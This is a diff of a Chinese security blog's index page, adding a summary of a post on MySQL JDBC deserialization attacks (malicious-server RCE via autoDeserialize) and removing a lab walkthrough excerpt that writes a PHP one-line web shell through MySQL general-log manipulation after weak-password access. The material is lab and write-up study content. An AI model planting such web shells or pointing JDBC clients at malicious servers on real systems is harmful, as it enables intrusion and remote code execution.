@@ -110,6 +110,21 @@
         alt="https://www.gravatar.com/avatar/aa99b351245441b8ca95d54a52d2998c?s=240&amp;d=mp"
         title="https://www.gravatar.com/avatar/aa99b351245441b8ca95d54a52d2998c?s=240&amp;d=mp" /></a></div><h1 class="home-title">ThnPinkman's blog</h1><div class="home-subtitle"><div id="id-1" class="typeit"></div></div><div class="links"></div></div>
 <article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
+        <a href="/posts/java%E5%AE%89%E5%85%A8/mysql_jdbc_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">mysql_jdbc_反序列化</a>
+    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
+</span>&nbsp;<span class="post-publish">published on <time datetime="2025-04-21">2025-04-21</time></span>&nbsp;<span class="post-category">included in <a href="/categories/java%E5%AE%89%E5%85%A8/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Java安全</a></span></div><div class="content">MYSQL JDBC反序列化 JDBC简介 JDBC（Java DataBase Connectivity）是一种用于执行Sql语句的Java Api，即Java数据库连接，是Java语言中用来规范客户端程序如何来访问数据库的应用程序接口，可以为多种关系数据库提供统一访问，提供了诸如查询和更新数据库中数据的方法，是Java访问数据库的标准规范。
+简单理解为链接数据库、对数据库操作都需要通过jdbc来实现。
+JDBC定义了一个叫java.sql.Driver的接口类负责实现对数据库的连接，所有的数据库驱动包都必须实现这个接口才能够完成数据库的连接操作。java.sql.DriverManager.getConnection(xxx)其实就是间接的调用了java.sql.Driver类的connect方法实现数据库连接的。数据库连接成功后会返回一个叫做java.sql.Connection的数据库连接对象，一切对数据库的查询操作都将依赖于这个Connection对象。
+一般的链接格式
+jdbc:driver://host:port/database?setting1=value1&amp;setting2=value2 漏洞原理 Mysql JDBC 中包含一个危险的扩展参数： &ldquo;autoDeserialize&rdquo;。这个参数配置为 true 时，JDBC 客户端将会自动反序列化服务端返回的数据，造成RCE漏洞。
+若攻击者能控制JDBC连接设置项，则可以通过设置其配置指向恶意MySQL服务器触发ObjectInputStream.readObject()，构造反序列化利用链从而造成RCE。
+当JDBC连接到数据库时，驱动会自动执行SHOW SESSION STATUS和SHOW COLLATION查询，并对查询结果进行反序列化处理,如果我们可以控制jdbc客户端的url连接，去连接我们自己的一个恶意mysql服务(这个恶意服务只需要能回复jdbc发来的数据包即可)，当jdbc驱动自动执行一些查询(如show session status或show collation)这个服务会给jdbc发送序列化后的payload，然后jdbc本地进行反序列化处理后触发RCE。
+JDBC连接参数 atementInterceptors:连接参数是用于指定实现 com.mysql.jdbc.StatementInterceptor 接口的类的逗号分隔列表的参数。这些拦截器可用于通过在查询执行和结果返回之间插入自定义逻辑来影响查询执行的结果，这些拦截器将被添加到一个链中，第一个拦截器返回的结果将被传递到第二个拦截器，以此类推。在 8.0 中被queryInterceptors参数替代。 queryInterceptors:一个逗号分割的Class列表（实现了com.mysql.cj.interceptors.QueryInterceptor接口的Class），在Query&quot;之间&quot;进行执行来影响结果。（效果上来看是在Query执行前后各插入一次操作） autoDeserialize:自动检测与反序列化存在BLOB字段中的对象。 detectCustomCollations:驱动程序是否应该检测服务器上安装的自定义字符集/排序规则，如果此选项设置为“true”，驱动程序会在每次建立连接时从服务器获取实际的字符集/排序规则。这可能会显着减慢连接初始化速度。 漏洞分析利用 demo搭建 pom.xml
+&lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;8.0.19&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;commons-collections&lt;/groupId&gt; &lt;artifactId&gt;commons-collections&lt;/artifactId&gt; &lt;version&gt;3.2.1&lt;/version&gt; &lt;/dependency&gt; 攥写demo代码，样例以ServerStatusDiffInterceptor作为触发点
+package org.example; import java.sql.Connection; import java.sql.DriverManager; public class APP { public static void main(String[] args) throws Exception { String ClassName = &#34;com.</div><div class="post-footer">
+        <a href="/posts/java%E5%AE%89%E5%85%A8/mysql_jdbc_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">Read More</a><div class="post-tags">
+                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/java/">Java</a></div></div>
+</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
         <a href="/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial/">春秋云镜 Initial</a>
     </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
 </span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-22">2024-08-22</time></span>&nbsp;<span class="post-category">included in <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>内网渗透</a></span></div><div class="content">春秋云镜 Initial 外网打点 站点图标很好判断是TP的站
@@ -209,29 +224,6 @@ frp存在服务端（frps）与客户端（frpc）， frps需要一直保持运�
 [common] bind_addr = 0.0.0.0 # 在服务端上绑定的ip bind_port = 7000 # 在服务端上绑定的端口 启动服务端</div><div class="post-footer">
         <a href="/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BAfrp/">Read More</a><div class="post-tags">
                 <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></div></div>
-</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
-        <a href="/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/">红日靶场 1</a>
-    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
-</span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>内网渗透</a></span></div><div class="content">红日靶场 1 01环境配置 在 VMware 中选择虚拟网络编辑器设置内网网段192.168.52.0/24，NAT 和DHCP都要设置
-win7上要多添加一个桥接网卡可以分配一个真实ip
-三台靶机的默认开机密码都为hongrisec@2019
-win7就用默认密码了 ，其他两个需要修改密码，我修改成hongrisec@2022
-win7提示重启，重启后打开phpstudy
-ipconfig查看
-可以看到分配的真实ip
-访问ip得到phpstudy探针，本机也可以
-同时我们需要保持外网、域网络防火墙为未开启状态
-02信息收集 探测内网存活 netdiscover -i eth0 -r 192.168.52.0/24 nmap扫描端口 nmap -Pn -sV -p- -A 192.168.52.143 --min-rate=1000 扫端口，可以利于80,3306
-80端口也就是刚才的phpstudy探针，可以看看有无利于点
-最下面有个mysql数据库连接检测的功能，root/root 最简单的弱口令 发现检测成功
-那去找一下mysql的后台登录页面，
-dirsearch扫描目录 可以看到不少phpmyadmin，找到后台 弱口令就登录进来了
-查看日志权限 show variables like &#39;general%&#39; set global general_log= &#34;ON&#34;; 打开权限set global general_log_file=&#34;C:/phpStudy/WWW/123.php&#34;; 设置查看日志的文件，文件路径可以在探针看 03Getshell 利用日志文件getshell sql语句执行 select &quot;&lt;?php phpinfo();?&gt;&quot; ;
-访问刚才定义的日志页面 ，可以getshell
-传入shell ,连接蚁剑
-select &#34;&lt;?php @eval($_POST[&#39;pass&#39;]);?&gt;&#34; ; Yxcms后台登录getshell mysql后台看到有个newyxcms的数据库</div><div class="post-footer">
-        <a href="/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/">Read More</a><div class="post-tags">
-                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></div></div>
 </article><ul class="pagination"><li class="page-item active">
                     <span class="page-link">
                         <a href="/">1</a>
@@ -248,12 +240,12 @@ select &#34;&lt;?php @eval($_POST[&#39;pass&#39;]);?&gt;&#34; ; Yxcms后台登�
                     <span class="page-link" aria-hidden="true">&hellip;</span>
                 </li><li class="page-item ">
                     <span class="page-link">
-                        <a href="/page/11/">11</a>
+                        <a href="/page/12/">12</a>
                     </span>
                 </li></ul></div></div>
             </main><footer class="footer">
         <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.133.0">Hugo</a> | Theme - <a href="https://github.com/Fastbyte01/KeepIt" target="_blank" rel="noopener noreffer" title="KeepIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> KeepIt</a>
-                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
         </div>
     </footer></div>
 
